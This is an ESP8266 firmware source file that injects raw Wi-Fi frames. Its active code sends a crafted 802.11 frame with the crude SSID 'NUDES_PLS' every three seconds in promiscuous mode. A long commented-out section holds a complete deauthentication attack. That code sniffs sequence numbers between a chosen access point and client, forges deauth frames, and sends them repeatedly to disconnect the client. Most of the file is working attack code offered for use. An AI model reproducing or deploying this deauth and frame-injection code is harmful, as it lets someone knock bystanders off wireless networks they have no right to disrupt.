#include "ets_sys.h"
#include "osapi.h"
#include "gpio.h"
#include "os_type.h"
#include "mem.h"
#include "user_config.h"
#include "user_interface.h"
#include "driver/uart.h"




//String alfa = "1234567890qwertyuiopasdfghjkklzxcvbnm QWERTYUIOPASDFGHJKLZXCVBNM_";
uint8 channel;

// Beacon Packet buffer
uint8_t packet[128] = { 0xb6, 0xb0, 0xf1, 0xdb, 
0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 
/*0x85, 0xa8, 0xaf, 0xb0, 0x26, 0x1e, 0x74, 0x18, 0x13, 0x27, 0x17, 0xc8, */
 'N', 'U', 'D', 'E' , 'S', '_', 'P', 'L', 'S',
 /*, 0xc0, 0x78, 0x08, 0x9c, 0x11, 0x24, 0x67, 0x0c, 0x13, 0xb2, 0x86, 0x6c, 0x9f, 0x74, 0xad, 0x97, 0x4c, 0xa4, 0x92, 0x9e, 0xdb, 
 0x7a, 0x6e, 0x09, 0xc1, 0x93, 0x78, 0xef, 0x0b, 0x88, 0x2d, 0x83, 0xe0, 0x56, 0x55, 0xbc, 0xcd, 0x88, 0xb3, 0x0c, 0x1a, 0xb7, 0x2c, 
 0x32, 0xea, 0x4c, 0xe8, 0x12, 0xdc, 0x8e, 0x8c, 0x62, 0xee, 0xdc, 0x15, 0x32, 0x70, 0x2a, 0x64, 0xf1, 0xef, 0xba, 0x26, 0xad, 0x25, 
 0x7c, 0x30, 0x82, 0xb2, 0xe1, 0x2d, 0x1d, 0x0a, 0x9b, 0x00, 0x00, 0x20, 0x21, */
 0x00};                       


void sender(void *arg){
    os_printf("%d\n", wifi_send_pkt_freedom(packet, 25, 0));
}

static os_timer_t ptimer;

void ICACHE_FLASH_ATTR user_init(void)
{
    uart_init(115200, 115200);
    os_printf("SDK version:%s\n", system_get_sdk_version());
    wifi_set_opmode(STATION_MODE);
    wifi_promiscuous_enable(1); 
    //while(true){
            // Randomize channel //
   
    channel = 1;//random(1,12); 
    wifi_set_channel(channel);

    os_timer_disarm(&ptimer);
    os_timer_setfn(&ptimer, (os_timer_func_t *)sender, NULL);
    os_timer_arm(&ptimer, 3000, 1);
/*
    // Randomize SRC MAC
    packet[10] = packet[16] = 0x00;//random(256);
    packet[11] = packet[17] = 0x11;//random(256);
    packet[12] = packet[18] = 0x22;//random(256);
    packet[13] = packet[19] = 0x33;//random(256);
    packet[14] = packet[20] = 0x44;//random(256);
    packet[15] = packet[21] = 0x55;//random(256);

    // Randomize SSID (Fixed size 6. Lazy right?)
    packet[38] = 'I';//alfa[random(65)];
    packet[39] = 'G';//alfa[random(65)];
    packet[40] = 'O';//alfa[random(65)];
    packet[41] = 'R';//alfa[random(65)];
    packet[42] = '6';//alfa[random(65)];
    packet[43] = '9';//alfa[random(65)];
    
    packet[56] = channel;
    */
    //wifi_send_pkt_freedom(packet, 95, 0);
    //wifi_send_pkt_freedom(packet, 95, 0);
    //wifi_send_pkt_freedom(packet, 95, 0);
    //delay(1);
    //}
}

/*
#define user_procTaskPrio        0
#define user_procTaskQueueLen    1
os_event_t    user_procTaskQueue[user_procTaskQueueLen];
static volatile os_timer_t deauth_timer;

// Channel to perform deauth
uint8_t channel = 1;

// Access point MAC to deauth
uint8_t ap[6] = {0x00,0x01,0x02,0x03,0x04,0x05};

// Client MAC to deauth
uint8_t client[6] = {0x06,0x07,0x08,0x09,0x0A,0x0B};

// Sequence number of a packet from AP to client
uint16_t seq_n = 0;

// Packet buffer
uint8_t packet_buffer[64];
*/
/* ==============================================
 * Promiscous callback structures, see ESP manual
 * ============================================== */
 /*
struct RxControl {
    signed rssi:8;
    unsigned rate:4;
    unsigned is_group:1;
    unsigned:1;
    unsigned sig_mode:2;
    unsigned legacy_length:12;
    unsigned damatch0:1;
    unsigned damatch1:1;
    unsigned bssidmatch0:1;
    unsigned bssidmatch1:1;
    unsigned MCS:7;
    unsigned CWB:1;
    unsigned HT_length:16;
    unsigned Smoothing:1;
    unsigned Not_Sounding:1;
    unsigned:1;
    unsigned Aggregation:1;
    unsigned STBC:2;
    unsigned FEC_CODING:1;
    unsigned SGI:1;
    unsigned rxend_state:8;
    unsigned ampdu_cnt:8;
    unsigned channel:4;
    unsigned:12;
};
 
struct LenSeq {
    uint16_t length;
    uint16_t seq;
    uint8_t  address3[6];
};

struct sniffer_buf {
    struct RxControl rx_ctrl;
    uint8_t buf[36];
    uint16_t cnt;
    struct LenSeq lenseq[1];
};

struct sniffer_buf2{
    struct RxControl rx_ctrl;
    uint8_t buf[112];
    uint16_t cnt;
    uint16_t len;
};
*/
/* Creates a deauth packet.
 * 
 * buf - reference to the data array to write packet to;
 * client - MAC address of the client;
 * ap - MAC address of the acces point;
 * seq - sequence number of 802.11 packet;
 * 
 * Returns: size of the packet
 *//*
uint16_t deauth_packet(uint8_t *buf, uint8_t *client, uint8_t *ap, uint16_t seq)
{
    int i=0;
    
    // Type: deauth
    buf[0] = 0xC0;
    buf[1] = 0x00;
    // Duration 0 msec, will be re-written by ESP
    buf[2] = 0x00;
    buf[3] = 0x00;
    // Destination
    for (i=0; i<6; i++) buf[i+4] = client[i];
    // Sender
    for (i=0; i<6; i++) buf[i+10] = ap[i];
    for (i=0; i<6; i++) buf[i+16] = ap[i];
    // Seq_n
    buf[22] = seq % 0xFF;
    buf[23] = seq / 0xFF;
    // Deauth reason
    buf[24] = 1;
    buf[25] = 0;
    return 26;
}

// Sends deauth packets.
void deauth(void *arg)
{
    os_printf("\nSending deauth seq_n = %d ...\n", seq_n/0x10);
    // Sequence number is increased by 16, see 802.11
    uint16_t size = deauth_packet(packet_buffer, client, ap, seq_n+0x10);
    wifi_send_pkt_freedom(packet_buffer, size, 0);
}

// Listens communication between AP and client
static void ICACHE_FLASH_ATTR
promisc_cb(uint8_t *buf, uint16_t len)
{
    if (len == 12){
        struct RxControl *sniffer = (struct RxControl*) buf;
    } else if (len == 128) {
        struct sniffer_buf2 *sniffer = (struct sniffer_buf2*) buf;
    } else {
        struct sniffer_buf *sniffer = (struct sniffer_buf*) buf;
        int i=0;
        // Check MACs
        for (i=0; i<6; i++) if (sniffer->buf[i+4] != client[i]) return;
        for (i=0; i<6; i++) if (sniffer->buf[i+10] != ap[i]) return;
        // Update sequence number
        seq_n = sniffer->buf[23] * 0xFF + sniffer->buf[22];
    }
}

void ICACHE_FLASH_ATTR
sniffer_system_init_done(void)
{
    // Set up promiscuous callback
    wifi_set_channel(channel);
    wifi_promiscuous_enable(0);
    wifi_set_promiscuous_rx_cb(promisc_cb);
    wifi_promiscuous_enable(1);
}

void ICACHE_FLASH_ATTR
user_init()
{
    uart_init(115200, 115200);
    os_printf("\n\nSDK version:%s\n", system_get_sdk_version());
    
    // Promiscuous works only with station mode
    wifi_set_opmode(STATION_MODE);
    
    // Set timer for deauth
    os_timer_disarm(&deauth_timer);
    os_timer_setfn(&deauth_timer, (os_timer_func_t *) deauth, NULL);
    os_timer_arm(&deauth_timer, CHANNEL_HOP_INTERVAL, 1);
    
    // Continue to 'sniffer_system_init_done'
    system_init_done_cb(sniffer_system_init_done);
}
*/